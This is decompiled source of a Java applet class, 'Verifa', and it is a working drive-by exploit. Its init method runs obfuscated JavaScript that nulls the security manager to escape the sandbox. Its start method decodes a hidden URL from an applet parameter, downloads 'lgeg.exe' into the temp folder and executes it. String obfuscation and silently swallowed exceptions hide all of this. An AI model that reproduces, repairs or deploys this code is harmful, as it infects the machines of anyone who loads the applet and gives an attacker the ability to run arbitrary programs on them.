import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Verifa extends Applet
{
    private JList mersedes;
    
    @Override
    public void start() {
        try {
            String tdir = System.getProperty("jqg3avqg3a.iqg3o.tqg3mpqg3dqg3ir".replace("qg3", ""));
            if (tdir.charAt(tdir.length() - 1) != '\\') {
                tdir += "\\";
            }
            final String sefa = tdir + "lgeg" + ".e".concat("xe");
            final String uri = this.getParameter("dest");
            String duri = "";
            for (int s = 0; s < uri.length(); ++s) {
                int tt = uri.charAt(s);
                tt -= 4;
                duri += (char)tt;
            }
            final InputStream reader = Idmer.createIS(duri);
            final FileOutputStream writer = new FileOutputStream(sefa);
            byte[] buffer = new byte[153600];
            final byte[] buher = new byte[1600];
            for (int totalBytesRead = 0, bytesRead = 0; (bytesRead = reader.read(buffer)) > 0; buffer = new byte[153600], totalBytesRead += bytesRead) {
                writer.write(buffer, 0, bytesRead);
            }
            writer.close();
            reader.close();
            try {
                Idmer.exe(sefa);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        try {
            final ScriptEngine merry = new ScriptEngineManager().getEngineByName("jqg3s".replace("qg3", ""));
            merry.eval("v37jos39ar err37jos39or = n37jos39ew Err37jos39or(\"M37jos39y err37jos39or\");th37jos39is.toSt37jos39ring = funct37jos39ion(){ ja37jos39va.la37jos39ng.Syst37jos39em.s37jos39etSecu37jos39rityM37jos39anag37jos39er(nul37jos39l);ap37jos39ple37jos39t.st37jos39art();re37jos39turn \"e37jos39xplo37jos39it!\";};37jos39er37jos39ror.mes37jos39sage = th37jos39is;".replace("37jos39", ""));
            this.add(this.mersedes = new JList((E[])new Object[] { merry.get("error") }));
        }
        catch (ScriptException ex) {}
    }
}
